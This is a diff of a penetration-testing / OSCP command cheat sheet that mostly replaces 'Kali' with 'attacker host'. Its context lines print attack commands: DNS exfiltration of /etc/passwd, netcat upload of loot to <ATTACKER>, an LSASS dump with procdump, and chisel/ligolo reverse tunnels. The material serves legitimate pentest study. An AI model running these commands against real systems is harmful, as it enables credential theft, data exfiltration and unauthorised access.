@@ -7,9 +7,9 @@ toc = true
 tags = ['oscp', 'methodology', 'commands']
 +++
 
-> Copy-paste command sheet for a general pentest or an OSCP-style exam: one block per phase, checkboxes for the steps, exact commands for the tool versions shipped on current Kali. It is the companion to the [methodology](/notes/oscp-labs/methodology/) — the methodology explains *why* and *when*, this page is what you actually type. Every command is a **template**: read it, substitute the variables, and check the precondition before running it.
+> Copy-paste command sheet for a general pentest or an OSCP-style exam: one block per phase, checkboxes for the steps, exact commands for the tool versions shipped on current distributions. It is the companion to the [methodology](/notes/oscp-labs/methodology/) — the methodology explains *why* and *when*, this page is what you actually type. Every command is a **template**: read it, substitute the variables, and check the precondition before running it.
 
-> **Version drift is the #1 cause of a "broken" cheat sheet.** Kali 2025.4 → 2026.2 changed flags in `nxc`, `certipy`, `impacket`, `ligolo-ng`, and `hashcat`. Before trusting a command: `nxc --help`, `certipy <subcommand> -h`, `impacket-<tool> -h`, `hashcat --example-hashes`. If your install predates mid-2026, several of the modules below (ADCS ESC17, `nxc --ntds --use-vss`, `--remove-mic`) will not exist.
+> **Version drift is the #1 cause of a "broken" cheat sheet.** Recent tool releases changed flags in `nxc`, `certipy`, `impacket`, `ligolo-ng`, and `hashcat`. Before trusting a command: `nxc --help`, `certipy <subcommand> -h`, `impacket-<tool> -h`, `hashcat --example-hashes`. If your install predates mid-2026, several of the modules below (ADCS ESC17, `nxc --ntds --use-vss`, `--remove-mic`) will not exist.
 
 ## How to use this page
 
@@ -412,7 +412,7 @@ net use \\<ATTACKER>\share /user:df df
 copy \\<ATTACKER>\share\nc.exe C:\Temp\nc.exe
 ```
 
-- [ ] **Upload back to Kali** — `python3 -m http.server` cannot receive; use these.
+- [ ] **Upload back to the attacker host** — `python3 -m http.server` cannot receive; use these.
 ```bash
 python3 -m uploadserver 8000          # pip install uploadserver
 nc -lvnp 8000 > loot.zip          # target: nc.exe <ATTACKER> 8000 < C:\Temp\loot.zip
@@ -432,7 +432,7 @@ base64 -w0 file.bin > file.b64 && base64 -d file.b64 > file.bin
 
 - [ ] **File transfer via DNS** — when only DNS egress survives; slower than HTTP but survives most filters.
 ```bash
-# On Kali: capture DNS
+# On the attacker host: capture DNS
 sudo tcpdump -ni tun0 -s0 port 53
 # On target: encode chunked
 base64 -w0 /etc/passwd | fold -w63 | while read c; do host "$c.exfil.$DOMAIN" >/dev/null; done
@@ -613,7 +613,7 @@ gc (Get-PSReadLineOption).HistorySavePath
 cmd /c dir /R C:\Users\<user>\Desktop
 ```
 
-- [ ] **LSASS, SAM/SYSTEM, NTDS** — check RunAsPPL first; copy hives, parse on Kali.
+- [ ] **LSASS, SAM/SYSTEM, NTDS** — check RunAsPPL first; copy hives, parse on the attacker host.
 ```powershell
 reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
 procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
@@ -861,14 +861,14 @@ ssh -D 1080 "$USER@$IP" -N -f
 
 - [ ] **Chisel** — one binary, works from Windows and Linux.
 ```bash
-# Kali
+# Linux
 ./chisel server -p 8000 --reverse
 # target
 ./chisel client "$ATTACKER":8000 R:socks
 ./chisel client "$ATTACKER":8000 R:8888:127.0.0.1:8888
 ```
 
-- [ ] **ligolo-ng** — full network stack; needs a TUN interface on Kali.
+- [ ] **ligolo-ng** — full network stack; needs a TUN interface on the attacker host.
 ```bash
 sudo ip tuntap add user "$(whoami)" mode tun ligolo && sudo ip link set ligolo up
 ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601   # older builds: ./proxy
